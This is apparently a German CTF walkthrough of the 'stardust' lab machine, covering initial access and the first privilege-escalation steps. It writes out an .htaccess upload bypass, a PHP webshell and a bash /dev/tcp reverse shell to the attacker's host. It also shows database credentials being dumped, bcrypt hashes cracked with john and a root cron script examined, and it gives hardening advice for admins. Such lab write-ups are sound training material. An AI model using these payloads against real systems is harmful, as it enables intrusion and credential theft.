+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Versuch zielt darauf ab, sowohl den Endungsfilter (durch das `.jpg` am Ende, obwohl das Leerzeichen davor problematisch sein könnte) als auch eine mögliche Content-Type-Prüfung (durch Setzen auf `x-php`) und eine Magic-Byte-Prüfung (durch `GIF89a;`) zu umgehen. Da der Upload erfolgreich war, scheint die serverseitige Validierung schwach zu sein. Es ist jedoch unklar, ob die Datei als PHP ausgeführt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, auf die hochgeladene Datei (`http://intranetik.stardust.hmv/shell.php%20.jpg`?) zuzugreifen und Code auszuführen. Wenn dies nicht funktioniert, ist der `.htaccess`-Ansatz vielversprechender.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie robuste, mehrstufige Upload-Validierung (Endung per Whitelist, MIME-Type serverseitig prüfen, Magic Bytes prüfen).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Upload-Versuch 2: Webshell mit harmloser Endung (.ben)</span></div>
+                    <pre>
+POST /index.php HTTP/1.1
+Host: intranetik.stardust.hmv
+[...]
+Content-Disposition: form-data; name="file"; filename="<span class="command">shell.ben</span>"
+Content-Type: image/jpeg <span class="password"><-- Erlaubter Content-Type</span>
+
+<span class="command">jpeg5:</span> <span class="password"><-- Beliebiger Inhalt, hier mit Hinweis</span>
+<span class="command">php system($GET['cmd']); </span> <span class="password"><-- PHP Payload</span>
+-----------------------------19823407031929607804901358391--
+
+<span class="password">HTTP/1.1 200 OK</span>
+[...]
+File uploaded successfully.
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird eine Datei mit dem Namen `shell.ben` und dem erlaubten `Content-Type: image/jpeg` hochgeladen. Der Inhalt ist jedoch wieder PHP-Code, diesmal mit einem vorangestellten String "jpeg5:". Der Upload ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anwendung erlaubt das Hochladen von Dateien mit der Endung `.ben`, wenn der Content-Type passt. Der Server wird diese Datei jedoch standardmäßig nicht als PHP ausführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste logische Schritt ist das Hochladen einer `.htaccess`-Datei, um dem Apache-Server beizubringen, Dateien mit der Endung `.ben` als PHP zu interpretieren.<br><strong>Empfehlung (Admin):</strong> Keine ausführbaren oder Konfigurationsdateien wie `.htaccess` erlauben. Whitelist für Dateiendungen verwenden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Upload-Versuch 3: .htaccess Datei</span></div>
+                    <pre>
+POST /index.php HTTP/1.1
+Host: intranetik.stardust.hmv
+[...]
+Content-Disposition: form-data; name="file"; filename="<span class="command">.htaccess</span>"
+Content-Type: application/x-php <span class="password"><-- Content-Type hier irrelevant</span>
+
+<span class="command">AddType application/x-httpd-php .ben</span> <span class="password"><-- .htaccess Inhalt</span>
+-----------------------------19823407031929607804901358391--
+
+<span class="password">HTTP/1.1 200 OK</span>
+[...]
+File uploaded successfully.
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Datei mit dem Namen `.htaccess` wird hochgeladen. Der Inhalt weist Apache an, Dateien mit der Endung `.ben` als PHP-Skripte zu behandeln (`AddType application/x-httpd-php .ben`). Der Upload ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Erfolg! Die Anwendung erlaubt das Hochladen von `.htaccess`-Dateien. Dies ermöglicht es dem Angreifer, die Serverkonfiguration für das aktuelle Verzeichnis (und potenziell Unterverzeichnisse) zu ändern und die zuvor hochgeladene `shell.ben` ausführbar zu machen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie nun die zuvor hochgeladene `shell.ben` (oder eine neu hochgeladene Version wie `chehade.ben`) mit einem `cmd`-Parameter auf, um RCE zu bestätigen und eine Reverse Shell zu starten.<br><strong>Empfehlung (Admin):</strong> Verhindern Sie das Hochladen von `.htaccess`-Dateien (und anderen sensiblen Konfigurationsdateien) durch eine strikte Whitelist für Dateinamen und Endungen. Konfigurieren Sie Apache global so, dass `.htaccess`-Overrides deaktiviert sind, wenn nicht unbedingt benötigt (`AllowOverride None`).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Upload-Versuch 4: Neue Webshell (.ben) nach .htaccess Upload</span></div>
+                     <pre>
+POST /index.php HTTP/1.1
+[...]
+Content-Disposition: form-data; name="file"; filename="<span class="command">chehade.ben</span>"
+Content-Type: image/jpeg
+
+jpeg5:
+<span class="command">php system($GET['cmd']);</span>
+-----------------------------19823407031929607804901358391--
+
+<span class="password">HTTP/1.1 200 OK</span>
+[...]
+File uploaded successfully.
+</pre>
+                     <div class="prompt"># <span class="command">RCE Test</span></div>
+                    <pre>
+Aufruf: http://intranetik.stardust.hmv/<span class="command">chehade.ben?cmd=id</span>
+Antwort: jpeg5: <span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem die `.htaccess`-Datei hochgeladen wurde, wird eine neue Webshell (`chehade.ben`) hochgeladen. Anschließend wird diese Shell mit dem Parameter `cmd=id` aufgerufen. Die Antwort enthält "jpeg5:" (den statischen Teil der hochgeladenen Datei) gefolgt von der Ausgabe des `id`-Befehls.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Remote Code Execution als `www-data` ist erfolgreich bestätigt! Der `.htaccess`-Upload hat Apache angewiesen, `.ben`-Dateien als PHP auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die RCE, um eine Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Upload-Schwachstelle und die Möglichkeit, `.htaccess` hochzuladen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                     <div class="prompt"># <span class="command">Aufruf der Webshell mit Reverse Shell Payload</span></div>
+                    <pre>Payload URL: http://intranetik.stardust.hmv/<span class="command">chehade.ben?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27</span></pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <div class="terminal">
+                         <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 59010</span>
+bash: cannot set terminal process group (499): Inappropriate ioctl for device
+bash: no job control in this shell
+</pre>
+                         <div class="prompt">www-data@stardust:/var/www/intranetik$ <span class="password"># Shell erhalten!</span></div>
+                     </div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird gestartet. Die Webshell `chehade.ben` wird mit einem Bash-Reverse-Shell-Payload aufgerufen. Der Listener empfängt die Verbindung, und der Angreifer erhält eine Shell als `www-data`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich etabliert via RCE durch Upload-Bypass.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell stabilisieren und mit der Enumeration als `www-data` beginnen.<br><strong>Empfehlung (Admin):</strong> Upload-Schwachstelle und `.htaccess`-Problem beheben.</p>
+
+        </section>
+
+        <section id="poc-initial">
+            <h2>Proof of Concept (Initial Access - Webshell Upload via .htaccess Bypass)</h2>
+
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Die Webanwendung unter `http://intranetik.stardust.hmv` (ein über einen Hinweis entdeckter VHost) verfügt über eine Dateiupload-Funktion (`index.php`), die eine unzureichende Filterung von Dateiendungen und -namen aufweist. Obwohl sie versucht, das Hochladen von Skriptdateien wie `.php` zu verhindern, erlaubt sie das Hochladen von `.htaccess`-Dateien. Dies ermöglicht einem Angreifer, zuerst eine `.htaccess`-Datei hochzuladen, die den Webserver (Apache) anweist, eine harmlose Dateiendung (z.B. `.ben`) als PHP-Skript zu interpretieren. Anschließend kann der Angreifer eine zweite Datei mit der harmlosen Endung (z.B. `shell.ben`) hochladen, die PHP-Webshell-Code enthält. Beim Aufruf dieser zweiten Datei wird der PHP-Code ausgeführt, was zu Remote Code Execution (RCE) führt.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                     <li>Netzwerkzugriff auf den VHost `intranetik.stardust.hmv`.</li>
+                     <li>Die Upload-Funktion muss das Hochladen von `.htaccess` erlauben.</li>
+                     <li>Der Apache-Webserver muss so konfiguriert sein, dass `.htaccess`-Dateien verarbeitet werden (`AllowOverride` ist nicht `None`).</li>
+                     <li>Ein Tool zum Senden manipulierter HTTP POST-Requests (z.B. Burp Suite oder `curl`).</li>
+                     <li>Ein vom Angreifer kontrollierter Webserver (optional, falls die Webshell direkt eingebettet wird).</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                 <ol>
+                    <li>
+                        <strong>`.htaccess`-Datei hochladen:</strong>
+                        Senden Sie einen POST-Request an `/index.php` auf `intranetik.stardust.hmv`. Verwenden Sie `multipart/form-data`. Setzen Sie den `filename` auf `.htaccess` und fügen Sie als Dateiinhalt die Direktive ein, um `.ben` als PHP zu behandeln:
+                        <div class="code-block">
+                             <pre>
+POST /index.php HTTP/1.1
+Host: intranetik.stardust.hmv
+[...]
+Content-Type: multipart/form-data; boundary=---BOUNDARY---
+[...]
+
+---BOUNDARY---
+Content-Disposition: form-data; name="file"; filename=".htaccess"
+Content-Type: text/plain <span class="password"><-- Content-Type hier weniger wichtig</span>
+
+AddType application/x-httpd-php .ben
+---BOUNDARY---
+</pre>
+                        </div>
+                        Bestätigen Sie den erfolgreichen Upload ("File uploaded successfully.").
+                    </li>
+                    <li>
+                         <strong>Webshell-Datei hochladen:</strong>
+                         Senden Sie einen weiteren POST-Request. Setzen Sie den `filename` auf einen Namen mit der neuen Endung (z.B. `chehade.ben`). Setzen Sie den `Content-Type` auf einen erlaubten Typ (z.B. `image/jpeg`). Fügen Sie als Dateiinhalt den PHP-Webshell-Code ein:
+                         <div class="code-block">
+                             <pre>
+POST /index.php HTTP/1.1
+Host: intranetik.stardust.hmv
+[...]
+Content-Type: multipart/form-data; boundary=---BOUNDARY---
+[...]
+
+---BOUNDARY---
+Content-Disposition: form-data; name="file"; filename="chehade.ben"
+Content-Type: image/jpeg
+
+php system($GET['cmd']);
+---BOUNDARY---
+</pre>
+                        </div>
+                        Bestätigen Sie den erfolgreichen Upload.
+                    </li>
+                    <li>
+                        <strong>RCE testen:</strong>
+                         Rufen Sie die hochgeladene `.ben`-Datei auf und übergeben Sie einen Befehl im `cmd`-Parameter:
+                         <div class="code-block">
+                             <div class="terminal">
+                                <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">curl "http://intranetik.stardust.hmv/chehade.ben?cmd=id"</span></div>
+                                 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                             </div>
+                         </div>
+                    </li>
+                </ol>
+            </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Die Fähigkeit, beliebige Betriebssystembefehle als `www-data`-Benutzer über die hochgeladene `.ben`-Datei auszuführen.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Die erfolgreiche Ausgabe des `id`-Befehls (oder anderer Testbefehle) beim Aufruf der `.ben`-Datei.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Die Umgehung von Upload-Filtern durch das Hochladen einer `.htaccess`-Datei ist eine bekannte Technik, die zu RCE führt und die vollständige Kompromittierung des Webservers ermöglicht.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                    <li>**Upload-Filterung verschärfen:** Verbieten Sie das Hochladen von `.htaccess` und anderen Konfigurationsdateien explizit (Whitelist für Dateinamen/Endungen).</li>
+                    <li>**Apache-Konfiguration härten:** Setzen Sie `AllowOverride None` in der Apache-Konfiguration für Verzeichnisse mit Upload-Möglichkeit, um die Verarbeitung von `.htaccess`-Dateien zu verhindern.</li>
+                    <li>**Serverseitige Validierung:** Implementieren Sie robuste Validierung für Dateitypen und -inhalte.</li>
+                    <li>**Sichere Speicherung:** Speichern Sie Uploads außerhalb des Web-Roots oder ohne Ausführungsrechte.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (NPM Exploit)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@stardust:/var/www/html/config$ <span class="command">cat config_db.php</span></div>
+                    <pre>
+
+class DB extends DBmysql {
+   public $dbhost = 'localhost';
+   public $dbuser = '<span class="command">glpi</span>';
+   public $dbpassword = '<span class="password">D6jsxBGek</span>'; <span class="password"><-- DB Passwort gefunden!</span>
+   public $dbdefault = '<span class="command">glpi</span>';
+[...]
+}
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird die Datei `/var/www/html/config/config_db.php` (wahrscheinlich durch Browsen im Dateisystem nach dem Shell-Zugriff gefunden) gelesen. Diese Datei enthält die Zugangsdaten für die MySQL-Datenbank, die von GLPI verwendet wird: Benutzer `<span class="command">glpi</span>` und Passwort `<span class="password">D6jsxBGek</span>`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fund von Datenbank-Zugangsdaten. Dies ermöglicht den Zugriff auf die GLPI-Datenbank und potenziell auf weitere Datenbanken auf demselben MySQL-Server.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verbinden Sie sich mit der MySQL-Datenbank (`mysql -u glpi -pD6jsxBGek`). Enumerieren Sie Datenbanken (`show databases;`), Tabellen (`use glpi; show tables;`, `use intranetikDB; show tables;`) und Benutzerdaten (insbesondere Passwort-Hashes in `glpi_users` und `intranetikDB.users`). Versuchen Sie, die gefundenen Hashes zu knacken.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Leserechte für Konfigurationsdateien wie `config_db.php` nur auf die notwendigen Benutzer (z.B. `root` und den Webserver-Benutzer). Verwenden Sie separate Datenbankbenutzer mit minimalen Rechten für verschiedene Anwendungen. Verwenden Sie keine leicht erratbaren Datenbankpasswörter.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@stardust:/var/www/html/config$ <span class="command">mysql -u glpi -pD6jsxBGek</span></div>
+                     <pre>Welcome to the MariaDB monitor. [...]</pre>
+                     <div class="prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                     <pre>
++--------------------+
+| Database           |
++--------------------+
+| glpi               |
+| information_schema |
+| <span class="command">intranetikDB</span>       | <span class="password"><-- Zusätzliche Datenbank</span>
++--------------------+
+</pre>
+                    <div class="prompt">MariaDB [(none)]> <span class="command">use intranetikDB;</span></div>
+                    <pre>Database changed</pre>
+                     <div class="prompt">MariaDB [intranetikDB]> <span class="command">show tables;</span></div>
+                     <pre>
++------------------------+
+| Tables_in_intranetikDB |
++------------------------+
+| users                  |
++------------------------+
+</pre>
+                    <div class="prompt">MariaDB [intranetikDB]> <span class="command">select * from users;</span></div>
+                    <pre>
++----+-----------+--------------------------------------------------------------+
+| id | username  | password                                                     |
++----+-----------+--------------------------------------------------------------+
+|  1 | carolynn  | $2b$12$HRVJrlSG5eSW44VaNlTwowu42c1l9AnbphDvcEXVMyhcB46ZtXC |
+[...]
+|  3 | <span class="command">tally</span>     | <span class="command">$2b$12$zzVJjW1Bvm4WqcPy6nqDFU4JRh2mMpbeKKbP21cn7FKtNy4Ycjl.</span> | <span class="password"><-- Hash für tally</span>
+[...]
++----+-----------+--------------------------------------------------------------+
+15 rows in set (0.000 sec)
+</pre>
+                     <div class="prompt">MariaDB [glpi]> <span class="command">select password,name from glpi_users;</span></div>
+                     <pre>
++--------------------------------------------------------------+-------------+
+| password                                                     | name        |
++--------------------------------------------------------------+-------------+
+| <span class="command">$2y$10$rXXzbc2ShaiCldwkw4AZL.n.9QSH7c0c9XJAyyjrbL9BwmWditAYm</span> | <span class="command">glpi</span>        | <span class="password"><-- Hash für glpi</span>
+[...]
++--------------------------------------------------------------+-------------+
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit den gefundenen Zugangsdaten wird eine Verbindung zur MariaDB-Datenbank hergestellt. Es wird eine zweite Datenbank namens `intranetikDB` entdeckt. In dieser Datenbank gibt es eine Tabelle `users`, die Benutzernamen und zugehörige Passwort-Hashes (im bcrypt-Format `$2b$12$...`) enthält, darunter der Benutzer `<span class="command">tally</span>`. Zusätzlich werden die Hashes der GLPI-Standardbenutzer aus der `glpi`-Datenbank abgefragt (bcrypt `$2y$10$...`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere Passwort-Hashes wurden erfolgreich aus den Datenbanken extrahiert. Diese können nun offline geknackt werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie die Hashes (insbesondere den von `tally`) auf Ihr Angreifer-System. Verwenden Sie `john` oder `hashcat` mit einer Wortliste (z.B. `rockyou.txt`), um die Hashes zu knacken.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke Hashing-Algorithmen mit hohem Cost-Faktor für Passwörter. Schützen Sie den Datenbankzugriff. Überprüfen Sie die Notwendigkeit der `intranetikDB`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">echo '$2y$10$rXXzbc2ShaiCldwkw4AZL.n.9QSH7c0c9XJAyyjrbL9BwmWditAYm' > hash</span></div> <span class="password"><-- Hash von 'glpi'</span>
+                     <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                    <pre>
+[...]
+Cost 1 (iteration count) is 1024 for all loaded hashes
+[...]
+<span class="password">Session aborted</span> <span class="password"><-- Knacken von 'glpi'-Hash nicht erfolgreich/abgebrochen</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, den bcrypt-Hash des GLPI-Benutzers `glpi` mit `john` und `rockyou.txt` zu knacken. Der Versuch wird abgebrochen oder bleibt erfolglos.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Passwort für `glpi` ist nicht in `rockyou.txt` enthalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den Hash des Benutzers `tally` aus der anderen Datenbank.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, nicht in Wörterbüchern enthaltene Passwörter.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">vi hash</span></div> <span class="password"><-- hash-Datei wird mit tally's Hash überschrieben</span>
+                    <pre>tally:$2b$12$zzVJjW1Bvm4WqcPy6nqDFU4JRh2mMpbeKKbP21cn7FKtNy4Ycjl.</pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 16 penMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+------------------------------------------------
+<span class="password">bonita</span>           (<span class="command">tally</span>) <span class="password"><-- Erfolg!</span>
+------------------------------------------------
+1g 0:00:00:02 DONE (2023-07-22 01:09) 0.3891g/s 168.0p/s 168.0c/s 168.0C/s karina..raymond
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der bcrypt-Hash (`$2b$12$...`) für den Benutzer `<span class="command">tally</span>` wird in die `hash`-Datei geschrieben (im `user:hash`-Format). `john` wird erneut mit `rockyou.txt` gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! `john` knackt den Hash und findet das Passwort `<span class="password">bonita</span>` für den Benutzer `<span class="command">tally</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie zum Benutzer `tally` auf dem Zielsystem (via `su tally` oder SSH, falls möglich) unter Verwendung des Passworts `<span class="password">bonita</span>`.<br><strong>Empfehlung (Admin):</strong> Starke Passwörter erzwingen. Datenbank sichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@stardust:/var/www/html/config$ <span class="command">su tally</span></div>
+                     <pre>Password:</pre>
+                     <div class="prompt"># <span class="command">[Passworteingabe: bonita]</span></div>
+                     <pre>tally@stardust:/var/www/html/config$ <span class="password"># Wechsel erfolgreich</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> In der `www-data`-Shell wird `su tally` ausgeführt. Das geknackte Passwort `<span class="password">bonita</span>` wird eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Horizontale Rechteausweitung von `www-data` zu `tally` erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie nun als `tally`. Prüfen Sie `sudo -l`, SUID-Binaries, Home-Verzeichnis etc.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, außer der Absicherung der initialen Lücke.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">tally@stardust:/var/www/html/config$ <span class="command">sudo -l</span></div>
+                     <pre>bash: sudo: <span class="password">command not found</span></pre>
+                     <div class="prompt">tally@stardust:/var/www/html/config$ <span class="command">find / -type f -perm -4000 2>/dev/null</span></div>
+                     <pre>
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `tally` wird versucht, `sudo -l` auszuführen, was fehlschlägt (`command not found`). Die Suche nach SUID-Dateien (`find / -perm -4000 ...`) zeigt nur Standard-Binaries, keine offensichtlich ausnutzbaren benutzerdefinierten Programme.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sudo` und SUID-Binaries scheinen keine direkten Eskalationswege von `tally` aus zu bieten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Home-Verzeichnis von `tally`, Cronjobs, laufende Prozesse und die Ergebnisse von `pspy` (falls noch nicht geschehen).<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, warum `sudo` nicht im Pfad ist oder nicht installiert ist. Stellen Sie sicher, dass keine unnötigen SUID-Binaries vorhanden sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">tally@stardust:~$ <span class="command">ls -la</span></div>
+                    <pre>
+[...]
+drwx------ 2 tally tally 4096 May  8 10:09 <span class="command">.ssh</span>
+-rwx------ 1 tally tally   33 May  7 09:40 <span class="command">user.txt</span>
+</pre>
+                     <div class="prompt">tally@stardust:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">f4c0971d361c2844bb9730846dc330c2</span></pre>
+                     <div class="prompt">tally@stardust:~/.ssh$ <span class="command">ls -la</span></div>
+                    <pre>
+[...]
+-rw------- 1 tally tally 2602 May  7 10:04 <span class="command">id_rsa</span>
+-rw-r--r-- 1 tally tally  572 May  7 10:04 <span class="command">id_rsa.pub</span>
+-rw-r--r-- 1 tally tally  222 May  8 10:09 known_hosts
+</pre>
+                    <div class="prompt">tally@stardust:~/.ssh$ <span class="command">cat id_rsa</span></div>
+                    <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">[...]</span>
+<span class="password">MAAAASdGFsbHlAc3RhcmR1c3QuaG12AQ</span> <span class="password"><-- Kommentar: tally@stardust.hmv</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `tally` wird die `user.txt` (User-Flag) gefunden und gelesen. Im Unterverzeichnis `.ssh` befindet sich ein SSH-Schlüsselpaar (`id_rsa`, `id_rsa.pub`). Der private Schlüssel `id_rsa` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> User-Flag gefunden. Der private SSH-Schlüssel von `tally` wurde gefunden. Es ist unklar, ob dieser Schlüssel für die Eskalation nützlich ist (z.B. für den Login als anderer Benutzer oder für `root`, falls `authorized_keys` entsprechend konfiguriert ist), da `tally` bereits eingeloggt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den privaten Schlüssel `id_rsa` auf Ihr System. Prüfen Sie, ob er passphrasengeschützt ist (`ssh2john`). Versuchen Sie, sich mit diesem Schlüssel als `root` oder andere gefundene Benutzer per SSH anzumelden (obwohl Root-Login wahrscheinlich deaktiviert ist). Untersuchen Sie weiter nach Cronjobs und Prozessen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass private SSH-Schlüssel korrekt geschützt sind (Berechtigungen `600`) und idealerweise mit starken Passphrasen versehen sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">tally@stardust:/dev/shm$ <span class="command">wget 192.168.2.199:8000/pspy64</span></div>
+                     <pre>[...]</pre>
+                     <div class="prompt">tally@stardust:/dev/shm$ <span class="command">chmod +x pspy64</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">tally@stardust:/dev/shm$ <span class="command">./pspy64</span></div>
+                     <pre>
+[...]
+2023/07/22 01:19:01 CMD: UID=0     PID=2331   | /bin/bash <span class="command">/opt/meteo</span>
+2023/07/22 01:19:01 CMD: UID=0     PID=2332   | /bin/bash <span class="command">/opt/meteo</span>
+2023/07/22 01:19:01 CMD: UID=0     PID=2335   | /bin/bash <span class="command">/opt/meteo</span>
+2023/07/22 01:19:01 CMD: UID=0     PID=2334   | /bin/bash <span class="command">/opt/meteo</span>
+2023/07/22 01:19:01 CMD: UID=0     PID=2333   | /bin/bash <span class="command">/opt/meteo</span>
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Prozess-Monitoring-Tool `pspy64` wird auf das Zielsystem hochgeladen und ausgeführt. `pspy` beobachtet laufende Prozesse und Cronjobs. Es wird entdeckt, dass regelmäßig (`pspy` zeigt es mehrfach pro Sekunde, was auf eine sehr häufige Ausführung hindeutet, z.B. jede Minute oder sogar öfter) ein Skript `/opt/meteo` als Benutzer mit UID=0 (also `root`) ausgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Ein Skript (`/opt/meteo`), das als `root` läuft, ist ein Hauptziel für Privilege Escalation, wenn es manipuliert oder beeinflusst werden kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Skript `/opt/meteo`. Prüfen Sie:
+            1.  Berechtigungen: Hat `tally` Schreibrechte auf das Skript selbst oder auf das Verzeichnis `/opt`?
+            2.  Inhalt: Was macht das Skript? Liest es Konfigurationsdateien, auf die `tally` Schreibrechte hat? Ruft es andere Befehle auf unsichere Weise auf (z.B. mit relativen Pfaden)? Verwendet es unsichere temporäre Dateien?<br>
+            <strong>Empfehlung (Admin):</strong> Überprüfen Sie alle Cronjobs und Skripte, die als `root` laufen, auf Sicherheit und Notwendigkeit. Stellen Sie sicher, dass Skripte und die von ihnen verwendeten Dateien/Verzeichnisse korrekte, restriktive Berechtigungen haben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">tally@stardust:/dev/shm$ <span class="command">cd /opt/</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">tally@stardust:/opt$ <span class="command">file meteo</span></div>
+                    <pre>meteo: <span class="command">Bourne-Again shell script, ASCII text executable</span></pre>
+                    <div class="prompt">tally@stardust:/opt$ <span class="command">ls -la /opt/meteo</span></div>
+                    <pre><span class="command">-rwxr-xr-x 1 root root 607 May  7 09:49 /opt/meteo</span></pre> <span class="password"><-- tally hat keine Schreibrechte!</span>
+                    <div class="prompt">tally@stardust:/opt$ <span class="command">cat meteo</span></div>
+                     <pre>
+#! /bin/bash
+
+#meteo
+config="<span class="command">/opt/config.json</span>" <span class="password"><-- Liest Konfigurationsdatei</span>
+latitude=$(jq '.latitude' $config)
+longitude=$(jq '.longitude' $config)
+limit=1000
+
+#sys
+web="/var/www/intranetik"
+users="/home/tally"
+root="/root"
+dest="/var/backups"
+
+#get rain elevation
+elevation=$(curl -s "https://api.open-meteo.com/v1/forecast?latitude=$latitude&longitude=$longitude&hourly=rain" |jq .elevation) <span class="password"><-- Ruft externe API auf</span>
+
+if [[ $elevation -gt $limit ]] ; then
+echo "RAIN ALERT !"
+<span class="command">tar -cf $dest/backup.tar $web >/dev/null</span> <span class="password"><-- Führt tar als root aus!</span>
+<span class="command">tar -rf $dest/backup.tar $users >/dev/null</span>
+<span class="command">tar -rf $dest/backup.tar $root >/dev/null</span>
+echo "BACKUP FINISHED"
+else
+echo "Weather is cool !"
+fi
